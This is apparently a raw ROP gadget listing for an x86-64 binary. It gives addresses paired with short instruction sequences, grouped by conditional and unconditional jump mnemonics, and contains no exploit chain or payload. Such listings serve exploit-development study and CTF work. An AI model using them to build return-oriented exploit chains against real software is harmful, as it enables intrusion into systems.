0x0000000000431eb6 : jbe 0x431ee7 ; lea rax, qword ptr [rdi + rax + 0x10] ; ret
0x0000000000431ec6 : jbe 0x431ee7 ; lea rax, qword ptr [rdi + rax + 0x20] ; ret
0x0000000000431ed6 : jbe 0x431ee7 ; lea rax, qword ptr [rdi + rax + 0x30] ; ret
0x00000000004322e7 : jbe 0x432358 ; add rax, rdi ; vzeroupper ; ret
0x000000000045cb82 : jbe 0x45cb7c ; ret
0x0000000000463c59 : jbe 0x463c19 ; mov r11d, 1 ; jmp 0x463c2e
0x000000000048865f : jbe 0x48866b ; ret
0x00000000004b7119 : jbe 0x4b7116 ; call qword ptr [rdx]
0x00000000004b7141 : jbe 0x4b713e ; call qword ptr [rbx]
0x000000000040040e : je 0x400414 ; call rax
0x0000000000400ac9 : je 0x400ae0 ; pop rbp ; mov edi, 0x6c2bd0 ; jmp rax
0x0000000000400b0b : je 0x400b20 ; pop rbp ; mov edi, 0x6c2bd0 ; jmp rax
0x0000000000401b78 : je 0x401b83 ; ret
0x000000000040a919 : je 0x40a95e ; xor edi, edi ; call 0x426b86
0x000000000040c2ee : je 0x40c2fe ; add dword ptr [rax - 9], ecx ; ror byte ptr [rax + 1], 1 ; ret
0x0000000000418e1d : je 0x418e48 ; cmp byte ptr [rax + 0x29], cl ; ret
0x0000000000419378 : je 0x41937f ; ret
0x000000000041d0e1 : je 0x41d110 ; or al, 0x48 ; mov dword ptr [rsp], edi ; call 0x419379
0x000000000041d565 : je 0x41d573 ; ret
0x0000000000429362 : je 0x42938e ; sub byte ptr [rax - 0x77], cl ; out dx, eax ; call rax
0x0000000000429853 : je 0x429866 ; lea rax, qword ptr [rdx - 0x10] ; ret
0x000000000042af12 : je 0x42aedd ; ret
0x0000000000430c93 : je 0x430c5d ; lea r10, qword ptr [r10 + r9] ; jmp r10
0x0000000000431b7a : je 0x431b82 ; xchg eax, edx ; sub eax, edx ; ret
0x0000000000431dac : je 0x431e03 ; xor byte ptr [rsi + 0xf], ah ; xlatb ; ret
0x000000000043208a : je 0x4320e1 ; xor byte ptr [rsi + 0xf], ah ; xlatb ; ret
0x0000000000432a55 : je 0x432a67 ; sbb eax, eax ; or eax, 1 ; ret
0x0000000000434077 : je 0x434081 ; add byte ptr [rax], al ; xor eax, eax ; ret
0x0000000000443ab3 : je 0x443a7d ; lea r10, qword ptr [r10 + r9] ; jmp r10
0x0000000000445643 : je 0x44560d ; lea r10, qword ptr [r10 + r9] ; jmp r10
0x0000000000446e21 : je 0x446e39 ; bsf eax, eax ; lea rax, qword ptr [rdi + rax] ; ret
0x0000000000447444 : je 0x44744e ; bsf eax, edx ; ret
0x0000000000447444 : je 0x44744f ; bsf eax, edx ; ret
0x00000000004474ed : je 0x447505 ; bsf rax, rdx ; ret
0x00000000004474ed : je 0x447506 ; bsf rax, rdx ; ret
0x000000000044748c : je 0x447519 ; bsf rax, rdx ; ret
0x000000000044dac3 : je 0x44dae4 ; ror byte ptr [rdi], 1 ; adc dword ptr [rdi + rdx - 0x40], edi ; ret
0x000000000044f16e : je 0x44f17c ; xor eax, eax ; ret
0x000000000044f169 : je 0x44f189 ; cmp eax, 2 ; je 0x44f181 ; xor eax, eax ; ret
0x000000000044f1bd : je 0x44f1a3 ; ret
0x00000000004509b7 : je 0x4509e2 ; adc byte ptr [rdi], cl ; xchg eax, esp ; ret 0x2044
0x0000000000450f1a : je 0x450f21 ; ret
0x00000000004528a9 : je 0x4528ae ; ret
0x000000000045290d : je 0x452912 ; ret
0x000000000045329c : je 0x4532af ; lea rdi, qword ptr [rcx + rax + 0x20] ; jmp rdx
0x0000000000453fc8 : je 0x453fd3 ; ret
0x0000000000453fe4 : je 0x453ff9 ; mov dword ptr [rip + 0x26cacc], edx ; pop rbx ; ret
0x00000000004580e5 : je 0x458113 ; mov rdi, qword ptr [rsp + 0x38] ; call rbx
0x000000000045889f : je 0x4588ce ; mov rdi, qword ptr [rsp + 0x38] ; call r12
0x0000000000458b8f : je 0x458bbe ; mov rdi, qword ptr [rsp + 0x38] ; call r12
0x0000000000458ed7 : je 0x458f06 ; mov rdi, qword ptr [rsp + 0x38] ; call r14
0x0000000000459116 : je 0x459145 ; mov rdi, qword ptr [rsp + 0x38] ; call r14
0x000000000045977e : je 0x4597ac ; mov rdi, qword ptr [rsp + 0x38] ; call rbx
0x000000000045a316 : je 0x45a345 ; mov rdi, qword ptr [rsp + 0x40] ; call r15
0x000000000045b3a2 : je 0x45b3d1 ; mov rdi, qword ptr [rsp + 0x38] ; call r14
0x000000000045be9b : je 0x45beca ; mov rdi, qword ptr [rsp + 0x38] ; call r15
0x000000000045c243 : je 0x45c272 ; mov rdi, qword ptr [rsp + 0x38] ; call r14
0x000000000045c687 : je 0x45c6b6 ; mov rdi, qword ptr [rsp + 0x40] ; call r15
0x000000000045cac2 : je 0x45caf0 ; mov rdi, qword ptr [rsp + 0x40] ; call rbx
0x000000000045d084 : je 0x45d0b3 ; mov rdi, qword ptr [rsp + 0x38] ; call r14
0x000000000045d013 : je 0x45d1c0 ; mov rdx, rax ; jmp 0x45cfd8
0x000000000045d418 : je 0x45d1c0 ; mov rdx, rax ; jmp 0x45d3dd
0x000000000045d48f : je 0x45d1c0 ; mov rdx, rax ; jmp 0x45d454
0x000000000045d3b3 : je 0x45d3e2 ; mov rdi, qword ptr [rsp + 0x38] ; call r14
0x000000000045d8c7 : je 0x45d8f6 ; mov rdi, qword ptr [rsp + 0x40] ; call r15
0x000000000045dd02 : je 0x45dd30 ; mov rdi, qword ptr [rsp + 0x40] ; call rbx
0x000000000045f377 : je 0x45f383 ; ret
0x000000000045f372 : je 0x45f388 ; cmp esi, 3 ; je 0x45f388 ; ret
0x000000000045fcca : je 0x45fcd0 ; call rsi
0x000000000045fdc6 : je 0x45fdcc ; call rax
0x00000000004611cb : je 0x4611d1 ; call rax
0x000000000046178e : je 0x46179b ; ret
0x0000000000469b31 : je 0x469964 ; jmp 0x469b02
0x000000000046f8ec : je 0x46f917 ; and byte ptr [rax + 1], cl ; ret
0x00000000004776c6 : je 0x477716 ; add esp, 0x20 ; pop rbx ; ret
0x00000000004776c5 : je 0x477717 ; add esp, 0x20 ; pop rbx ; ret
0x000000000047851c : je 0x478523 ; ret
0x0000000000478539 : je 0x478546 ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000478573 : je 0x4785d5 ; pop rbp ; pop r12 ; ret
0x00000000004785ff : je 0x478661 ; pop rbp ; pop r12 ; ret
0x000000000047878a : je 0x4787b4 ; or al, 0xeb ; ret 0x5590
0x000000000047a40c : je 0x47a435 ; bsf rax, rdx ; ret
0x000000000047a40c : je 0x47a436 ; bsf rax, rdx ; ret
0x000000000047a39c : je 0x47a449 ; bsf rax, rdx ; ret
0x000000000047a8ab : je 0x47a8b3 ; ret
0x000000000047ae8e : je 0x47aebd ; sbb byte ptr [rax - 0x77], cl ; out dx, eax ; mov r9, r14 ; call rbx
0x000000000047afb8 : je 0x47afc5 ; test edx, edx ; jne 0x47afb7 ; ret
0x000000000047b459 : je 0x47b479 ; mov cl, dl ; and cl, 0xf ; je 0x47b489 ; ret
0x000000000047b460 : je 0x47b482 ; ret
0x000000000047b475 : je 0x47b496 ; add rax, 2 ; ret
0x000000000047c932 : je 0x47ca31 ; xor eax, eax ; leave ; ret
0x0000000000485336 : je 0x485343 ; mov qword ptr [rsi], rdi ; mov rax, rcx ; ret
0x0000000000487b0d : je 0x487a5f ; sub eax, r8d ; ret
0x000000000048bc42 : je 0x48bc56 ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000048c148 : je 0x48c173 ; or byte ptr [rax + 1], cl ; ret
0x000000000048dd3d : je 0x48dd82 ; shl rdx, 5 ; add rdx, rax ; jmp 0x48dd59
0x000000000048e906 : je 0x48e913 ; ret
0x000000000049174d : je 0x491778 ; adc byte ptr [rcx - 0x77], cl ; ret
0x0000000000493ce8 : je 0x493cd2 ; add rsp, 0x18 ; ret
0x0000000000493cd1 : je 0x493cf6 ; add rsp, 0x18 ; ret
0x0000000000493d78 : je 0x493d58 ; ret
0x0000000000493db9 : je 0x493dc6 ; mov qword ptr [rdi + rsi*8], rdx ; ret
0x00000000004960aa : je 0x4960b3 ; ret
0x00000000004960e3 : je 0x4960f4 ; mov eax, dword ptr [rdi] ; test eax, eax ; jne 0x4960f9 ; ret
0x00000000004961ba : je 0x4961c3 ; ret
0x0000000000497953 : je 0x49795e ; call rax
0x000000000049ba98 : je 0x49ba9f ; cli ; jmp rsp
0x000000000049d15c : je 0x49d1c3 ; sti ; call qword ptr [rax]
0x000000000049d158 : je 0x49d1c3 ; sti ; push qword ptr [rdx - 5] ; call qword ptr [rax]
0x000000000049d18c : je 0x49d1f3 ; sti ; jmp rax
0x000000000049d188 : je 0x49d1f3 ; sti ; push qword ptr [rdx - 5] ; jmp rax
0x00000000004aed28 : je 0x4aecf3 ; xor al, 0xd8 ; ret
0x00000000004aef67 : je 0x4aef64 ; jmp 0x4aef3e
0x00000000004afa62 : je 0x4afa2a ; ret 0xacfc
0x00000000004b84cc : je 0x4b84c8 ; stc ; jmp qword ptr [rdx]
0x0000000000401827 : jg 0x40182f ; jne 0x401824 ; ret
0x0000000000403a75 : jg 0x403a8e ; movdqu xmmword ptr [rdi + 0x10], xmm2 ; ret
0x0000000000403a79 : jg 0x403ad6 ; adc bl, dh ; ret
0x000000000041d562 : jg 0x41d5a2 ; add byte ptr [rcx + rcx - 0xd], dh ; ret
0x0000000000436579 : jg 0x4365cc ; ret
0x00000000004365ff : jg 0x43664a ; ret
0x0000000000436779 : jg 0x4367cc ; ret 0x894c
0x00000000004367ff : jg 0x43684a ; ret 0x894c
0x0000000000438f49 : jg 0x438f9c ; ret
0x0000000000438fcf : jg 0x43901a ; ret
0x0000000000439149 : jg 0x43919c ; ret 0x894c
0x00000000004391cf : jg 0x43921a ; ret 0x894c
0x000000000043b538 : jg 0x43b589 ; loope 0x43b537 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x000000000043b5af : jg 0x43b5fa ; ret 0xff2
0x000000000043b5c8 : jg 0x43b619 ; loop 0x43b5c7 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x000000000043b63f : jg 0x43b68a ; ret
0x000000000043b658 : jg 0x43b6a9 ; jrcxz 0x43b657 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x000000000043b6e8 : jg 0x43b739 ; in al, 0xf3 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x000000000043b768 : jg 0x43b7b9 ; in eax, 0xf3 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x000000000043b7e8 : jg 0x43b839 ; out 0xf3, al ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x000000000043b868 : jg 0x43b8b9 ; out 0xf3, eax ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x000000000043b8e8 : jg 0x43b939 ; call 0x4fc2c8ea
0x000000000043b968 : jg 0x43b9b9 ; jmp 0x4fc2c96a
0x000000000043bae8 : jg 0x43bb39 ; in al, dx ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x000000000043bb68 : jg 0x43bbb9 ; in eax, dx ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x000000000043bbf8 : jg 0x43bc49 ; out dx, al ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x000000000043bc78 : jg 0x43bcc9 ; out dx, eax ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x000000000043bcec : jg 0x43bcf7 ; ret
0x000000000043bd46 : jg 0x43bd59 ; ret
0x000000000043bd41 : jg 0x43bd91 ; psllq mm1, qword ptr [rdi] ; jg 0x43bd5e ; ret
0x000000000043bdb6 : jg 0x43bdc9 ; ret
0x000000000043be26 : jg 0x43be39 ; ret
0x000000000043be21 : jg 0x43be71 ; or eax, 0xf7f0ff3 ; ret
0x000000000043be96 : jg 0x43bea9 ; ret
0x000000000043be91 : jg 0x43bee1 ; or al, 0xf3 ; movq qword ptr [rdi], mm1 ; ret
0x000000000043bf06 : jg 0x43bf19 ; ret
0x000000000043bf01 : jg 0x43bf51 ; or esi, ebx ; movq qword ptr [rdi], mm1 ; ret
0x000000000043bf76 : jg 0x43bf89 ; ret
0x000000000043bf71 : jg 0x43bfc1 ; or dh, bl ; movq qword ptr [rdi], mm1 ; ret
0x000000000043bfe6 : jg 0x43bff9 ; ret
0x000000000043bfe1 : jg 0x43c031 ; or ebx, esi ; movq qword ptr [rdi], mm1 ; ret
0x000000000043c056 : jg 0x43c069 ; ret
0x000000000043c051 : jg 0x43c0a1 ; or bl, dh ; movq qword ptr [rdi], mm1 ; ret
0x000000000043c0c6 : jg 0x43c0d9 ; ret
0x000000000043c136 : jg 0x43c149 ; ret
0x000000000043c1a6 : jg 0x43c1b9 ; ret
0x000000000043c1a1 : jg 0x43c1f1 ; add eax, 0xf7f0ff3 ; ret
0x000000000043c216 : jg 0x43c229 ; ret
0x000000000043c211 : jg 0x43c261 ; add al, 0xf3 ; movq qword ptr [rdi], mm1 ; ret
0x000000000043c286 : jg 0x43c299 ; ret
0x000000000043c281 : jg 0x43c2d1 ; add esi, ebx ; movq qword ptr [rdi], mm1 ; ret
0x000000000043c2f6 : jg 0x43c309 ; ret
0x000000000043c2f1 : jg 0x43c341 ; add dh, bl ; movq qword ptr [rdi], mm1 ; ret
0x000000000043c366 : jg 0x43c379 ; ret
0x000000000043c361 : jg 0x43c3b1 ; add ebx, esi ; movq qword ptr [rdi], mm1 ; ret
0x000000000043e058 : jg 0x43e0a9 ; loope 0x43e057 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x000000000043e0cf : jg 0x43e11a ; ret 0xff2
0x000000000043e0e8 : jg 0x43e139 ; loop 0x43e0e7 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x000000000043e15f : jg 0x43e1aa ; ret
0x000000000043e178 : jg 0x43e1c9 ; jrcxz 0x43e177 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x000000000043e208 : jg 0x43e259 ; in al, 0xf3 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x000000000043e288 : jg 0x43e2d9 ; in eax, 0xf3 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x000000000043e308 : jg 0x43e359 ; out 0xf3, al ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x000000000043e388 : jg 0x43e3d9 ; out 0xf3, eax ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x000000000043e408 : jg 0x43e459 ; call 0x4fc2f40a
0x000000000043e488 : jg 0x43e4d9 ; jmp 0x4fc2f48a
0x000000000043e608 : jg 0x43e659 ; in al, dx ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x000000000043e688 : jg 0x43e6d9 ; in eax, dx ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x000000000043e718 : jg 0x43e769 ; out dx, al ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x000000000043e798 : jg 0x43e7e9 ; out dx, eax ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x000000000043e80c : jg 0x43e817 ; ret
0x000000000043e866 : jg 0x43e879 ; ret
0x000000000043e861 : jg 0x43e8b1 ; psllq mm1, qword ptr [rdi] ; jg 0x43e87e ; ret
0x000000000043e8d6 : jg 0x43e8e9 ; ret
0x000000000043e946 : jg 0x43e959 ; ret
0x000000000043e941 : jg 0x43e991 ; or eax, 0xf7f0ff3 ; ret
0x000000000043e9b6 : jg 0x43e9c9 ; ret
0x000000000043e9b1 : jg 0x43ea01 ; or al, 0xf3 ; movq qword ptr [rdi], mm1 ; ret
0x000000000043ea26 : jg 0x43ea39 ; ret
0x000000000043ea21 : jg 0x43ea71 ; or esi, ebx ; movq qword ptr [rdi], mm1 ; ret
0x000000000043ea96 : jg 0x43eaa9 ; ret
0x000000000043ea91 : jg 0x43eae1 ; or dh, bl ; movq qword ptr [rdi], mm1 ; ret
0x000000000043eb06 : jg 0x43eb19 ; ret
0x000000000043eb01 : jg 0x43eb51 ; or ebx, esi ; movq qword ptr [rdi], mm1 ; ret
0x000000000043eb76 : jg 0x43eb89 ; ret
0x000000000043eb71 : jg 0x43ebc1 ; or bl, dh ; movq qword ptr [rdi], mm1 ; ret
0x000000000043ebe6 : jg 0x43ebf9 ; ret
0x000000000043ec56 : jg 0x43ec69 ; ret
0x000000000043ecc6 : jg 0x43ecd9 ; ret
0x000000000043ecc1 : jg 0x43ed11 ; add eax, 0xf7f0ff3 ; ret
0x000000000043ed36 : jg 0x43ed49 ; ret
0x000000000043ed31 : jg 0x43ed81 ; add al, 0xf3 ; movq qword ptr [rdi], mm1 ; ret
0x000000000043eda6 : jg 0x43edb9 ; ret
0x000000000043eda1 : jg 0x43edf1 ; add esi, ebx ; movq qword ptr [rdi], mm1 ; ret
0x000000000043ee16 : jg 0x43ee29 ; ret
0x000000000043ee11 : jg 0x43ee61 ; add dh, bl ; movq qword ptr [rdi], mm1 ; ret
0x000000000043ee86 : jg 0x43ee99 ; ret
0x000000000043ee81 : jg 0x43eed1 ; add ebx, esi ; movq qword ptr [rdi], mm1 ; ret
0x000000000043efe4 : jg 0x43eff5 ; vmovdqu ymmword ptr [r9 - 0x20], ymm1 ; ret
0x000000000043eff8 : jg 0x43f009 ; vmovdqu xmmword ptr [r9 - 0x10], xmm1 ; ret
0x000000000043f46a : jg 0x43f466 ; ret
0x000000000044ad16 : jg 0x44ad21 ; ret
0x000000000044ad26 : jg 0x44ad34 ; mov byte ptr [rdi + 0x10], dh ; ret
0x000000000044ad3a : jg 0x44ad49 ; mov word ptr [rdi + 0x10], cx ; ret
0x000000000044ad59 : jg 0x44ad67 ; mov dword ptr [rdi + 0xf], ecx ; ret
0x000000000044ad69 : jg 0x44ad77 ; mov dword ptr [rdi + 0x10], ecx ; ret
0x000000000044ad79 : jg 0x44ad8a ; mov dword ptr [rdi + 0x10], ecx ; mov byte ptr [rdi + 0x14], dh ; ret
0x000000000044ad9a : jg 0x44ada9 ; mov qword ptr [rdi + 0xe], rcx ; ret
0x000000000044adba : jg 0x44adc9 ; mov qword ptr [rdi + 0xf], rcx ; ret
0x000000000044adda : jg 0x44ade9 ; mov qword ptr [rdi + 0x10], rcx ; ret
0x000000000044adfa : jg 0x44ae0c ; mov qword ptr [rdi + 0x10], rcx ; mov byte ptr [rdi + 0x18], dh ; ret
0x000000000044ae3d : jg 0x44ae4f ; mov qword ptr [rdi + 0x10], rdx ; mov dword ptr [rdi + 0x17], ecx ; ret
0x000000000044ae5d : jg 0x44ae6f ; mov qword ptr [rdi + 0x10], rdx ; mov dword ptr [rdi + 0x18], ecx ; ret
0x000000000044ae7b : jg 0x44ae8b ; movdqu xmmword ptr [rdi + 0xd], xmm2 ; ret
0x000000000044ae9b : jg 0x44aeab ; movdqu xmmword ptr [rdi + 0xe], xmm2 ; ret
0x000000000044aebb : jg 0x44aecb ; movdqu xmmword ptr [rdi + 0xf], xmm2 ; ret
0x000000000044aedb : jg 0x44aeeb ; movdqu xmmword ptr [rdi + 0x10], xmm2 ; ret
0x000000000044b3a6 : jg 0x44b3b5 ; lea rax, qword ptr [rdi + 0xf] ; ret
0x000000000044b3b6 : jg 0x44b3c8 ; mov byte ptr [rdi + 0x10], dh ; lea rax, qword ptr [rdi + 0x10] ; ret
0x000000000044b3e9 : jg 0x44b3fb ; mov dword ptr [rdi + 0xf], ecx ; lea rax, qword ptr [rdi + 0x12] ; ret
0x000000000044b409 : jg 0x44b41b ; mov dword ptr [rdi + 0x10], ecx ; lea rax, qword ptr [rdi + 0x13] ; ret
0x000000000044b52f : jg 0x44b58f ; or eax, 0x1c478d48 ; ret
0x000000000044d777 : jg 0x44d787 ; vmovdqu xmmword ptr [rsi - 0x10], xmm0 ; ret
0x000000000044d76d : jg 0x44d78d ; vmovdqu ymmword ptr [rsi - 0x20], ymm2 ; ret
0x000000000044dc04 : jg 0x44dc3c ; movups xmmword ptr [r11], xmm8 ; ret
0x000000000044dcd2 : jg 0x44dd0a ; movups xmmword ptr [r11], xmm8 ; ret
0x000000000044ddaa : jg 0x44ddbb ; vmovdqu xmmword ptr [rdi + rdx - 0x10], xmm1 ; ret
0x000000000044df3b : jg 0x44df65 ; vzeroupper ; ret
0x000000000044dfe2 : jg 0x44dfec ; vzeroupper ; ret
0x000000000044e06e : jg 0x44e098 ; vzeroupper ; ret
0x000000000044e0fe : jg 0x44e108 ; vzeroupper ; ret
0x000000000044e212 : jg 0x44e223 ; vmovdqu xmmword ptr [rdi + rdx - 0x10], xmm1 ; ret
0x000000000044e3f6 : jg 0x44e420 ; vzeroupper ; ret
0x000000000044e3f5 : jg 0x44e421 ; vzeroupper ; ret
0x000000000044e4bc : jg 0x44e4c6 ; vzeroupper ; ret
0x000000000044e4bb : jg 0x44e4c7 ; vzeroupper ; ret
0x000000000044e58f : jg 0x44e5b9 ; vzeroupper ; ret
0x000000000044e58e : jg 0x44e5ba ; vzeroupper ; ret
0x000000000044e662 : jg 0x44e66c ; vzeroupper ; ret
0x000000000044e661 : jg 0x44e66d ; vzeroupper ; ret
0x000000000044e6cc : jg 0x44e6d7 ; ret
0x000000000044e71c : jg 0x44e727 ; ret
0x000000000044e824 : jg 0x44e832 ; vzeroupper ; ret
0x000000000044e874 : jg 0x44e882 ; vzeroupper ; ret
0x000000000044e933 : jg 0x44e941 ; vzeroupper ; ret
0x000000000044e9b1 : jg 0x44e9bf ; vzeroupper ; ret
0x000000000044e9b0 : jg 0x44e9c0 ; vzeroupper ; ret
0x000000000044ea11 : jg 0x44ea1f ; vzeroupper ; ret
0x000000000044ea10 : jg 0x44ea20 ; vzeroupper ; ret
0x000000000044eafb : jg 0x44eb09 ; vzeroupper ; ret
0x000000000044eb09 : jg 0x44eb17 ; vzeroupper ; ret
0x000000000044eb60 : jg 0x44eb9d ; ret 0x2b77
0x000000000044ec7b : jg 0x44ec48 ; mov eax, 0x80 ; pop rbx ; ret
0x000000000044ecd7 : jg 0x44ecd5 ; int1 ; mov eax, eax ; ret
0x000000000045ac98 : jg 0x45ac25 ; ret 0xdb76
0x000000000045ac98 : jg 0x45ac29 ; ret 0xdb76
0x0000000000465c92 : jg 0x465cab ; test byte ptr [rip - 0x7c000011], al ; ret
0x0000000000470262 : jg 0x47027b ; test byte ptr [rip - 0x7c000003], dl ; ret
0x00000000004716da : jg 0x4716f3 ; test byte ptr [rbp - 0x7c000018], bl ; ret
0x00000000004717d7 : jg 0x4717f0 ; test byte ptr [rax - 0x7c000019], ah ; ret
0x0000000000475fed : jg 0x476006 ; add eax, edi ; mov rdx, r8 ; jmp 0x475fc5
0x0000000000485fc7 : jg 0x485fd9 ; test rdi, rdi ; jne 0x485fa8 ; ret
0x0000000000491598 : jg 0x4915a2 ; add byte ptr [rcx - 0x77], cl ; ror byte ptr [rax - 0x77], 1 ; ret 0x3575
0x00000000004058de : jge 0x40591e ; add al, 0x24 ; add esp, eax ; ret
0x000000000041488a : jge 0x414893 ; mov rax, qword ptr [rsp + 8] ; call rax
0x00000000004511e5 : jge 0x4511ea ; call r12
0x000000000045120d : jge 0x451212 ; call r12
0x00000000004516fd : jge 0x4516ad ; mov r12d, r14d ; call r15
0x0000000000451d5d : jge 0x451d62 ; call r12
0x0000000000451d89 : jge 0x451d8e ; call r12
0x0000000000451dbd : jge 0x451dc2 ; call r12
0x0000000000451ded : jge 0x451df2 ; call r12
0x0000000000451e15 : jge 0x451e1a ; call r12
0x0000000000451e45 : jge 0x451e4a ; call r12
0x0000000000494132 : jge 0x49412f ; leave ; ret
0x00000000004942b0 : jge 0x4942b3 ; mov rbp, qword ptr [rbp] ; mov rsp, rcx ; ret
0x00000000004943fc : jge 0x4943f9 ; leave ; ret
0x0000000000494448 : jge 0x49444b ; mov rbp, qword ptr [rbp] ; mov rsp, rcx ; ret
0x00000000004945d7 : jge 0x4945da ; mov rbp, qword ptr [rbp] ; mov rsp, rcx ; ret
0x0000000000494737 : jge 0x494734 ; leave ; ret
0x0000000000494788 : jge 0x49478b ; mov rbp, qword ptr [rbp] ; mov rsp, rcx ; ret
0x00000000004ba73d : jge 0x4ba745 ; add byte ptr [rax + 8], ah ; cld ; jmp qword ptr [rax]
0x00000000004ba73c : jge 0x4ba746 ; add byte ptr [rax + 8], ah ; cld ; jmp qword ptr [rax]
0x0000000000407aaf : jl 0x407add ; or al, 0x48 ; mov eax, dword ptr [rsp + 0x18] ; call rax
0x000000000040b3c6 : jl 0x40b3f1 ; sub byte ptr [rax - 0x7d], cl ; ret
0x0000000000413db8 : jl 0x413de3 ; or byte ptr [rcx - 0x77], cl ; ret 0x8b4c
0x0000000000419374 : jl 0x4193a7 ; add byte ptr [rax], al ; je 0x419383 ; ret
0x000000000041da32 : jl 0x41da4e ; add byte ptr [rax - 0x7d], cl ; ret 0x4801
0x000000000042547b : jl 0x425475 ; ret 0x7508
0x000000000043ef64 : jl 0x43efb3 ; adc dword ptr [rcx - 1], edi ; ret
0x000000000043efa0 : jl 0x43efef ; adc dword ptr [rcx - 1], ebx ; ret
0x000000000043f19e : jl 0x43f1ed ; adc dword ptr [rcx - 1], edi ; ret
0x000000000043f305 : jl 0x43f354 ; adc dword ptr [rcx + 7], edi ; ret
0x000000000043f467 : jl 0x43f4b6 ; adc dword ptr [rdi - 8], edi ; ret
0x000000000044d72c : jl 0x44d77b ; adc dword ptr [rsi - 1], edx ; ret
0x000000000044d74d : jl 0x44d79c ; adc dword ptr [rsi - 1], edx ; ret
0x000000000044d760 : jl 0x44d7af ; adc dword ptr [rsi - 1], edx ; ret
0x000000000044d835 : jl 0x44d884 ; adc dword ptr [rsi - 1], edx ; ret
0x000000000044d88d : jl 0x44d8dc ; adc dword ptr [rsi + 3], edx ; ret
0x000000000044d92a : jl 0x44d979 ; adc dword ptr [rsi + 7], edx ; ret
0x000000000044e2e0 : jl 0x44e2ff ; cld ; vzeroupper ; ret
0x00000000004512c2 : jl 0x4512f0 ; or byte ptr [rax - 0x75], cl ; and al, 0x10 ; call rax
0x00000000004579d1 : jl 0x4579ff ; and byte ptr [rax - 0x75], cl ; and al, 0x10 ; call rax
0x0000000000457df6 : jl 0x457e24 ; cmp byte ptr [rax - 0x75], cl ; and al, 0x18 ; call rax
0x0000000000459d38 : jl 0x459d66 ; mov rax, qword ptr [rsp + 0x20] ; call rax
0x000000000045a31b : jl 0x45a345 ; call r15
0x000000000045ad6a : jl 0x45ad98 ; cmp byte ptr [rax - 0x75], cl ; and al, 0x18 ; call rax
0x000000000045c68c : jl 0x45c6b6 ; call r15
0x000000000045cac7 : jl 0x45caf0 ; call rbx
0x000000000045cb7d : jl 0x45cbaa ; add byte ptr [rsi + rsi*2 - 0xa], sil ; ret
0x000000000045d2ad : jl 0x45d2d7 ; or al, 0xe9 ; ret
0x000000000045d8cc : jl 0x45d8f6 ; call r15
0x000000000045dd07 : jl 0x45dd30 ; call rbx
0x000000000045ddbd : jl 0x45ddea ; add byte ptr [rdx + rdi*2 - 0xa], sil ; ret
0x0000000000461da7 : jl 0x461dd2 ; and byte ptr [rax + 1], cl ; ret
0x000000000046221e : jl 0x462249 ; or byte ptr [rax - 0x7d], cl ; call qword ptr [rbx]
0x0000000000462566 : jl 0x462591 ; xor byte ptr [rax + 0x39], cl ; ret 0x8d48
0x000000000046df2b : jl 0x46df58 ; add byte ptr [rcx + 0xf], al ; xchg eax, esp ; ret
0x000000000046f615 : jl 0x46f640 ; adc byte ptr [rax - 0x7d], cl ; ret
0x00000000004821c5 : jl 0x4821f0 ; or byte ptr [rax - 0x7d], cl ; ret 0x101
0x00000000004891b5 : jl 0x4891e3 ; sbb byte ptr [rax - 0x75], cl ; push rsp ; and al, 0x10 ; call rdx
0x00000000004b24cc : jl 0x4b24cf ; std ; call rsp
0x00000000004b7ea4 : jl 0x4b7e6a ; stc ; jmp qword ptr [rdx]
0x0000000000424245 : jle 0x424258 ; add byte ptr [rax], al ; call 0x400507
0x000000000044748e : jle 0x447497 ; add byte ptr [rax], al ; bsf rax, rdx ; ret
0x000000000044748e : jle 0x447498 ; add byte ptr [rax], al ; bsf rax, rdx ; ret
0x000000000044d601 : jle 0x44d63d ; movsxd rax, ecx ; ret
0x000000000045f3c2 : jle 0x45f3d5 ; sub eax, 1 ; mov dword ptr [rbx + 8], eax ; pop rbx ; ret
0x000000000040349f : jmp 0x3996f701
0x0000000000406414 : jmp 0x406432
0x0000000000406727 : jmp 0x406745
0x0000000000406a95 : jmp 0x406ab3
0x0000000000407d49 : jmp 0x407c7e
0x000000000040b2c3 : jmp 0x40ad3a
0x000000000041552c : jmp 0x4154e7
0x0000000000415cc9 : jmp 0x415c8e
0x000000000041b1c2 : jmp 0x41b188
0x0000000000446c64 : jmp 0x446c2a
0x0000000000446db8 : jmp 0x446d7d
0x0000000000446e7c : jmp 0x446e42
0x0000000000446fc8 : jmp 0x446f8d
0x000000000044d2ee : jmp 0x44d2b4
0x000000000044d3bf : jmp 0x44d385
0x000000000044d42e : jmp 0x44d3f4
0x000000000044fe93 : jmp 0x44fd21
0x0000000000450211 : jmp 0x45016e
0x00000000004505a1 : jmp 0x450501
0x0000000000450645 : jmp 0x45060a
0x00000000004506eb : jmp 0x4506b0
0x000000000045491e : jmp 0x454108
0x00000000004560c3 : jmp 0x455dc4
0x0000000000463c61 : jmp 0x463c26
0x0000000000463cfe : jmp 0x463cc2
0x0000000000466043 : jmp 0x466048
0x0000000000469b37 : jmp 0x469afc
0x0000000000471458 : jmp 0x47141e
0x0000000000475d64 : jmp 0x475d29
0x0000000000475d63 : jmp 0x475d2a
0x00000000004766a5 : jmp 0x4765ba
0x0000000000476a5b : jmp 0x476a20
0x0000000000479113 : jmp 0x4790d9
0x000000000047c371 : jmp 0x47c2c3
